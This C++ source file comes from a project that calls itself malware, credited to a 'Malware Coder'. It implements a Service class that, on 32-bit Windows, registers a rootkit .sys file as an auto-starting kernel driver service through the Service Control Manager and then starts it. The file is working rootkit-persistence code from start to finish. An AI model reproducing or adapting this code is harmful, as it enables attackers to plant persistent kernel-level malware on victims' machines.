/*
##################################################
#                                                #
#         Malware Coder: Elliot Alderson         #
#                                                #
#   Github: https://github.com/ElliotAlderson51  #
#                                                #
##################################################
*/

#include "Service.h"

Service::Service()
{
	// Rootkit (32-bit)
	if (Tools::isSystem32Bit())
	{
		std::string rootkitPath = MOCK_FOLDER + "\\" + ROOTKIT_SYS_FILE_NAME + ".sys";
		if (Tools::FileExists(rootkitPath))
			if (this->CreateRootkitService(ROOTKIT_SYS_FILE_NAME, rootkitPath))
				this->StartServiceX(ROOTKIT_SYS_FILE_NAME); // Start the Rootkit
	}
}

BOOL Service::CreateRootkitService(const std::string& serviceName, const std::string& binaryPath)
{
	SC_HANDLE hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (hSCManager != NULL)
	{
		SC_HANDLE hService = CreateServiceA(
			hSCManager,
			serviceName.c_str(), serviceName.c_str(),
			SC_MANAGER_ALL_ACCESS,
			SERVICE_KERNEL_DRIVER,
			SERVICE_AUTO_START,
			SERVICE_ERROR_NORMAL,
			binaryPath.c_str(),
			NULL, NULL, NULL, NULL, NULL
			);			// password 

		if (hService != NULL)
		{
			CloseServiceHandle(hService);
			CloseServiceHandle(hSCManager);
			return TRUE;
		}
		
		CloseServiceHandle(hSCManager);
	}

#ifndef LOG_OFF
	std::cout << "CreateServiceX - FAILED, Error code #" << GetLastError() << "\n\n";
#endif // !LOG_OFF


	return FALSE;
}

BOOL Service::StartServiceX(const std::string& serviceName)
{
	SC_HANDLE schSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (schSCManager != NULL)
	{
		SC_HANDLE schService = OpenServiceA(schSCManager, serviceName.c_str(), SERVICE_ALL_ACCESS);
		if (schService != NULL)
		{
			StartServiceA(schService, NULL, NULL);
#ifndef LOG_OFF
			std::cout << "Start Service " << serviceName << " Success\n";
#endif // !LOG_OFF
			return TRUE;
		}
	}

#ifndef LOG_OFF
	std::cout << "Start Service " << serviceName << " FAILED, Error code #" << GetLastError() << "\n";
#endif // !LOG_OFF

	return FALSE;
}